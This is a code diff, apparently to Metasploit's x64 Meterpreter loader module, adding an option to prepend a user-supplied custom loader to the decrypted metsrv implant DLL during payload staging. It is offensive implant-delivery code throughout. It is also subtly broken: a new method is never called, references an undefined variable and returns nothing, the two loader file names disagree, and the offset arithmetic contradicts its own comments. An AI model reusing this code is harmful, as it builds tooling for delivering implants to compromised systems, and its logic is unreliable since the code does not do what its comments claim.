@@ -29,6 +29,9 @@ module Payload::Windows::MeterpreterLoader_x64
       'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
       'Stage'         => { 'Payload'   => "" }
       ))
+      register_options([
+        OptBool.new('MeterpreterLoader::CustomLoader', [ false, 'Use a custom loader', false ]),
+      ], self.class)
   end
 
   def asm_invoke_metsrv(opts={})
@@ -71,6 +74,31 @@ module Payload::Windows::MeterpreterLoader_x64
     stage_meterpreter(opts) + generate_config(opts)
   end
 
+  def stage_with_custom_loader(opts={})
+    ds = opts[:datastore] || datastore
+    debug_build = ds['MeterpreterDebugBuild']
+    metsrv_path = MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build)
+    meterpreter_data_dir = File.join(Msf::Config.data_directory, 'meterpreter')
+    custom_loader_path = File.join(meterpreter_data_dir, 'custom_loader_x64.bin')
+    print_status("Generating custom loader for Meterpreter stage...")
+    unless File.exist?(custom_loader_path)
+      print_status("Custom loader not found at #{custom_loader_path}, drop your loader there and try again.")
+      raise RuntimeError, "Custom loader not found at #{custom_loader_path}"
+    end
+    
+    custom_loader = File.binread(custom_loader_path)
+    encrypted_dll = ::File.binread(dll_path)
+    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: encrypted_dll)
+
+    asm_opts = {
+      rdi_offset: dll.length, # we will append the dll to the end of the custom loader, so the offset to it is just the length of the custom loader
+      length:     dll.length + custom_loader.length, # the total length of the payload is the length of the custom loader + the dll
+      stageless:  opts[:stageless] == true
+    }
+
+  end
+
+
   def generate_config(opts={})
     ds = opts[:datastore] || datastore
     opts[:uuid] ||= generate_payload_uuid
@@ -97,14 +125,35 @@ module Payload::Windows::MeterpreterLoader_x64
   def stage_meterpreter(opts={})
     ds = opts[:datastore] || datastore
     debug_build = ds['MeterpreterDebugBuild']
+    custom_loader = ds['MeterpreterLoader::CustomLoader'] == true
     # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build))
 
-    asm_opts = {
-      rdi_offset: offset,
-      length:     dll.length,
-      stageless:  opts[:stageless] == true
-    }
+    unless custom_loader
+      dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build))
+      asm_opts = {
+        rdi_offset: offset,
+        length:     dll.length,
+        stageless:  opts[:stageless] == true
+      }
+    else
+      dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build)))
+      custom_loader_path = ::File.join(Msf::Config.data_directory, 'meterpreter', 'custom_loader.x64.bin')
+      unless ::File.exist?(custom_loader_path)
+        print_status("Custom loader not found at #{custom_loader_path}, drop your loader there and try again.")
+        raise RuntimeError, "Custom loader not found at #{custom_loader_path}"
+      end
+      custom_loader = ::File.binread(custom_loader_path)
+      asm_opts = {
+        rdi_offset: dll.length, # we will append the dll to the end of the custom loader, so the offset to it is just the length of the custom loader
+        length:     dll.length + custom_loader.length, # the total length of the payload is the length of the custom loader + the dll
+        stageless:  opts[:stageless] == true
+      }
+      vprint_status("Using custom loader at #{custom_loader_path}")
+      vprint_status("Custom loader length: #{custom_loader.length} bytes")
+      vprint_status("DLL length: #{dll.length} bytes")
+      vprint_status("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
+      vprint_status("Configuration offset: #{asm_opts[:length]} bytes")
+    end
 
     asm = asm_invoke_metsrv(asm_opts)
 
@@ -118,7 +167,7 @@ module Payload::Windows::MeterpreterLoader_x64
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
-
+    dll = dll + custom_loader if custom_loader
     dll
   end
 
